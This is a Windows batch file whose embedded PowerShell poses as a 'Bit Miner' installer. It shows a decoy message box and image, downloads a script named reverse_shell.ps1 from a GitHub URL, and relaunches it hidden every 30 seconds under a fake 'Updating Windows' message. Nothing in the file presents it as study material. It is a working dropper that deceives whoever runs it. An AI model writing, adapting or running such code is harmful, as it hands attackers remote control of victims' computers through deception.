@echo off
powershell -ExecutionPolicy Bypass -Command ^
    "$tempPath = [System.IO.Path]::GetTempPath(); " ^
    "Set-Location -Path $tempPath; " ^
    "Add-Type -AssemblyName PresentationFramework; " ^
    "[System.Windows.MessageBox]::Show('Do you want to install Bit Miner', 'Status', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information); " ^
    "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/bitmin.png' -OutFile ($tempPath + 'bitmin.png'); " ^
    "Start-Process -FilePath ($tempPath + 'bitmin.png'); " ^
    "$scriptUrl = 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reverse_shell.ps1'; " ^
    "$scriptPath = $tempPath + 'reverse_shell.ps1'; " ^
    "Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath; " ^
    "while ($true) { " ^
    "    Start-Process -FilePath 'powershell.exe' -ArgumentList ('-ExecutionPolicy Bypass -File ' + $scriptPath) -WindowStyle Hidden; " ^
    "    Write-Host 'Updating Windows Do Not Turn off...'; " ^
    "    Start-Sleep -Seconds 30; " ^
    "}"
